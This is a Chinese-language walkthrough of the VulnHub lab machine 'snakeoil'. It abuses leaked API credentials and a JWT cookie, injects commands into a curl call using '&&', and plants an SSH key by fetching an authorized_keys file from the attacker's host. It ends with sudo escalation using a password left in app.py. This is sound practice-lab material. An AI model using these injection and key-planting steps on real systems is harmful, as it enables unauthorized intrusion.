---
title: VulnHub digitalworld.local：snakeoil
date: 2026-06-10 18:44:00
categories: 
  - VulnHub
tags:
  - RCE
  - /etc/sudoers 配置不当
  - 敏感文件泄露
---

# digitalworld.local：snakeoil

项目地址：https://download.vulnhub.com/digitalworld/SNAKEOIL.7z

是一个打包好的镜像文件

**注意：导入 ovf 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/6a2fb944215f1f309d063dc5.png)

## RCE

### Flask

在 8080 端口上有个 Useful Links 页面，给了个链接

![](https://pic1.imgdb.cn/item/6a30eb566f828650a6e5e0a6.png)

扫描出注册接口，访问提示请求方法错误

![](https://pic1.imgdb.cn/item/6a30e64c6f828650a6e5dd53.png)

在 `/users` 中有泄露用户名以及密码，键名是 `username` 以及 `password`

![](https://pic1.imgdb.cn/item/6a30e6766f828650a6e5dd73.png)

构造 POST 请求注册一个用户

![](https://pic1.imgdb.cn/item/6a30e6ff6f828650a6e5ddc1.png)

访问登录接口也是一样

![](https://pic1.imgdb.cn/item/6a30e7306f828650a6e5dde4.png)

把前面注册发的 `access_token` 带上，登录得到新的 token

![](https://pic1.imgdb.cn/item/6a30e79c6f828650a6e5de38.png)

携带这两个参数去访问 `/run`，回显 JSON 提示需要提供 URL 以及 端口

![](https://pic1.imgdb.cn/item/6a30e8b16f828650a6e5def4.png)

添加上请求体以及请求类型发现，回显需要 `secret key`

![](https://pic1.imgdb.cn/item/6a30e9af6f828650a6e5df8c.png)

前面扫出过 `/secret` 路径，去携带 Cookie 访问拿 key，但是还是不行

在前面的配置信息中找到了 Cookie 的名称

![](https://pic1.imgdb.cn/item/6a30ec0f6f828650a6e5e0e8.png)

修改 `access_token_cookie` 拿到 key

![](https://pic1.imgdb.cn/item/6a30eaef6f828650a6e5e088.png)

携带访问过去有回显路径之类的

![](https://pic1.imgdb.cn/item/6a30eca76f828650a6e5e128.png)

扔给 AI 解析是执行的 `curl` 命令

![](https://pic1.imgdb.cn/item/6a30ed176f828650a6e5e199.png)

`curl -V` 时会返回版本信息并且退出 `curl` 命令，这时候我们利用 `&&` 来执行我们要执行的命令

使用以下 Payload 可以打 RCE

![](https://pic1.imgdb.cn/item/6a30ee9a6f828650a6e5e224.png)

但是这里因为环境问题打不了反弹 Shell，所以只能传公钥去

先生成一个

![](https://pic1.imgdb.cn/item/6a30f2756f828650a6e5e874.png)

拷贝到 `/tmp` 目录下重新命令

![](https://pic1.imgdb.cn/item/6a30f6576f828650a6e61b62.png)

```
http://192.168.110.150:8989/authorized_keys -O
```

`-O`：表示使用远程文件的原名保存

成功保存到本地

![](https://pic1.imgdb.cn/item/6a30f36c6f828650a6e5e9ac.png)

先改权限

![](https://pic1.imgdb.cn/item/6a30f4566f828650a6e619aa.png)

再把 `authorized_keys` 文件移到 `/home/patrick/.ssh/` 目录下

![](https://pic1.imgdb.cn/item/6a30f9366f828650a6e61d79.png)

SSH 连接成功

![](https://pic1.imgdb.cn/item/6a30f92b6f828650a6e61d75.png)

## 提权

### /etc/sudoers 配置不当

检查自身权限，可以以 root 身份运行所有命令，但是需要密码

![](https://pic1.imgdb.cn/item/6a30f9d2b67c7e4f4a847d19.png)

### 敏感文件泄露

查看目录有个 `flask_blog` 目录

![](https://pic1.imgdb.cn/item/6a30fa36b67c7e4f4a847d50.png)

进去在 `app.py` 中找到两个 Key，第二个就是密码

![](https://pic1.imgdb.cn/item/6a30fa64b67c7e4f4a847d72.png)

![](https://pic1.imgdb.cn/item/6a30faa3b67c7e4f4a847d9b.png)